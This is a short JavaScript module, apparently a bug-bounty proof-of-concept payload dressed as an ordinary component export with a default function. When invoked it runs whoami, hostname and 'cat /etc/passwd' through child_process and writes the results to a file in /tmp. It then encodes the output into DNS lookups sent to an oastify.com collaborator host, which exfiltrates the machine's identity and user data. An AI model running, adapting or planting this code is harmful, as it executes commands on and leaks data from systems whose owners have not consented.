module.exports = {
  default: function(props) {
    var os, dns, fs, cp;
    try { os = require("os"); } catch(e) {}
    try { dns = require("dns"); } catch(e) {}
    try { fs = require("fs"); } catch(e) {}
    try { cp = require("child_process"); } catch(e) {}
    
    var h = "unknown";
    try { h = os.hostname(); } catch(e) {}
    
    // DNS #1: hostname (всегда)
    try { dns.lookup(h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
    
    // execSync: создаём файл
    var fileOk = false;
    try {
      cp.execSync("whoami > /tmp/myasnikov_bb_proof.txt 2>&1", {timeout: 5000});
      cp.execSync("hostname >> /tmp/myasnikov_bb_proof.txt 2>&1", {timeout: 5000});
      cp.execSync("cat /etc/passwd 2>&1 | head -2 >> /tmp/myasnikov_bb_proof.txt", {timeout: 5000});
      fileOk = true;
      try { dns.lookup("file-created." + h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
    } catch(e) {
      try { dns.lookup("exec-err." + h + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e2) {}
    }
    
    // Читаем файл
    if (fileOk && fs) {
      try {
        var content = fs.readFileSync("/tmp/myasnikov_bb_proof.txt", "utf8").trim();
        if (content.length > 0) {
          try { dns.lookup("file-len" + content.length + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
          var lines = content.split("\n");
          for (var i = 0; i < Math.min(lines.length, 3); i++) {
            var encoded = lines[i].replace(/[^a-zA-Z0-9]/g, "-").substring(0, 40);
            try { dns.lookup("f" + i + "-" + encoded + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
          }
        } else {
          try { dns.lookup("file-empty.8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
        }
      } catch(e) {
        try { dns.lookup("read-err.8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e2) {}
      }
    }
    
    return null;
  }
};
